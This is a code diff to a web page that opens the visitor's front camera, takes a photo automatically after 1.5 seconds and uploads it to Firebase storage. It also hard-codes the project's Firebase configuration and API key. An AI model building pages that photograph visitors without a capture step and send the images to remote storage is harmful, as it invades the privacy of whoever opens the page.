@@ -27,6 +27,11 @@
       font-size: 18px;
     }
   </style>
+
+  <!-- Firebase CDN -->
+  <script src="https://www.gstatic.com/firebasejs/10.5.2/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.5.2/firebase-storage.js"></script>
+
 </head>
 <body>
 
@@ -37,12 +42,30 @@
   <p id="status">Waiting for camera…</p>
 
   <script>
+    /* ------------------------------
+       🔥 Firebase Configuration
+    ------------------------------ */
+    const firebaseConfig = {
+      apiKey: "AIzaSyBOJ0RaxZN9fak3nAv5G0ZoV23XjSGm_wo",
+      authDomain: "main-camera.firebaseapp.com",
+      projectId: "main-camera",
+      storageBucket: "main-camera.appspot.com", // FIXED
+      messagingSenderId: "259782254190",
+      appId: "1:259782254190:web:2757ef530aa1b000b3d07f"
+    };
+
+    const app = firebase.initializeApp(firebaseConfig);
+    const storage = firebase.storage();
+
+    /* ------------------------------
+       📷 Start Camera
+    ------------------------------ */
     async function startCamera() {
       try {
         document.getElementById("status").innerText = "Requesting camera...";
 
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }, // front camera
+          video: { facingMode: "user" },
           audio: false
         });
 
@@ -51,17 +74,19 @@
 
         video.onloadedmetadata = () => {
           video.play();
-          setTimeout(capturePhoto, 1500);
+          setTimeout(capturePhoto, 1500); // auto-capture after 1.5 sec
         };
 
       } catch (err) {
         document.getElementById("status").innerHTML =
-          "❌ Camera permission denied or blocked.<br><br>" +
-          err.message +
-          "<br><br>Go to Browser Settings → Site Settings → Allow Camera for this site.";
+          "❌ Camera permission denied.<br><br>" +
+          err.message;
       }
     }
 
+    /* ------------------------------
+       📸 Capture + Upload to Firebase
+    ------------------------------ */
     function capturePhoto() {
       const video = document.getElementById("video");
       const canvas = document.getElementById("canvas");
@@ -72,7 +97,25 @@
 
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      document.getElementById("status").innerText = "📸 Photo captured automatically!";
+      document.getElementById("status").innerText = "📸 Photo captured! Uploading...";
+
+      canvas.toBlob(async (blob) => {
+        const filename = `photo_${Date.now()}.jpg`;
+        const storageRef = storage.ref().child(filename);
+
+        try {
+          const snapshot = await storageRef.put(blob);
+          const url = await snapshot.ref.getDownloadURL();
+
+          document.getElementById("status").innerHTML =
+            "✅ Uploaded!<br><br>Download URL:<br>" +
+            `<a href='${url}' target='_blank' style='color:cyan;'>${url}</a>`;
+
+        } catch (e) {
+          document.getElementById("status").innerText =
+            "❌ Upload failed: " + e.message;
+        }
+      }, "image/jpeg");
     }
 
     startCamera();
